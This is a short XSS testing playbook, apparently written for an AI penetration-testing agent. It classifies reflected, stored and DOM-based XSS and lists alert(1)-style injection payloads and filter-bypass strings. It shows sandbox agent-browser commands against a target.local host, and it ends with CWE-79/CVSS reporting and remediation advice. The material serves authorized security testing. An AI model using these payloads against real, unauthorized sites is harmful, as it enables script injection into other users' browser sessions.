# Offensive Playbook: Cross-Site Scripting (XSS) & Client-Side Exploitation

## 1. Overview & Attack Surface
Cross-Site Scripting (XSS) occurs when an application includes untrusted user input in a web page without proper contextual encoding or sanitization, allowing an attacker to execute arbitrary JavaScript in the victim's browser session.

## 2. Classification & Detection

### A. Reflected XSS
Input is immediately returned in the HTTP response:
- Search parameters: `/search?q=<script>alert(1)</script>`
- Error messages: `/login?error=Invalid+user+<img src=x onerror=alert(1)>`

### B. Stored XSS
Payload is saved in a database (e.g. comments, user profile names, feedback forms, tickets) and rendered to other users or administrators.

### C. DOM-based XSS
Client-side JavaScript reads from an untrusted source (`location.search`, `location.hash`, `document.referrer`, `window.name`) and writes to an execution sink (`innerHTML`, `document.write`, `eval`, `setTimeout`).

## 3. Sandbox Browser Automated Validation (`agent-browser`)
In the sandbox, test execution using the headless Chromium agent browser:
```bash
agent-browser navigate "https://target.local/profile?name=<script>window.__xss_fired=true</script>"
agent-browser eval "window.__xss_fired"
```

## 4. Contextual Filter & CSP Bypasses
- Inside HTML attribute: `" onfocus="alert(1)" autofocus="`
- Inside JavaScript string literal: `';alert(1);//` or `</script><script>alert(1)</script>`
- Filter stripping `<script>`: `<svg/onload=alert(1)>` or `<img src=1 onerror=alert(1)>`
- Markdown rendering injection: `[Click Me](javascript:alert(1))`

## 5. Verification & Reporting
1. Confirm JavaScript execution in a realistic user context (e.g. proof of cookie reading or DOM manipulation).
2. File finding via `create_vulnerability_report`:
   - **Category**: Client-Side Attacks (OWASP A03:2021)
   - **CWE**: CWE-79
   - **CVSS 3.1**: `AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N` (Base 6.1 Medium / High for Stored)
   - **Remediation**: Use context-aware HTML entity encoding and strict Content Security Policy (CSP).
